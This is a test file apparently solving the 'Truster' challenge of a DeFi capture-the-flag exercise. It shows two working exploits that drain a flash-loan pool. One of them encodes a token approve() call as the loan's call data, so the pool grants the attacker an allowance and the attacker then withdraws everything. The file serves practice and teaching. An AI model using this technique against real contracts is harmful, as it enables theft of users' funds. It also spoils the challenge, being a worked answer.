const { ethers } = require('hardhat');
const { expect } = require('chai');
const hre = require("hardhat");

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();
        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const attackerContractFactory = await ethers.getContractFactory("Attacker");
        const attackerContract = await attackerContractFactory.deploy(this.pool.address, this.token.address)
                                                              .then(c => c.connect(attacker));
        const tx = await attackerContract.attack();
        await tx.wait();
    });

    it('ExploitWithoutContract', async function() {
        const interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount) external"]);
        const data = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
        let tx = await this.pool.flashLoan(0, attacker.address, this.token.address, data);
        await tx.wait();
        expect(await this.token.allowance(this.pool.address, attacker.address).then(a => a.toString())).to.be.equal(TOKENS_IN_POOL);
        let tokenForAttacker = this.token.connect(attacker);
        tokenForAttacker.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    })

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

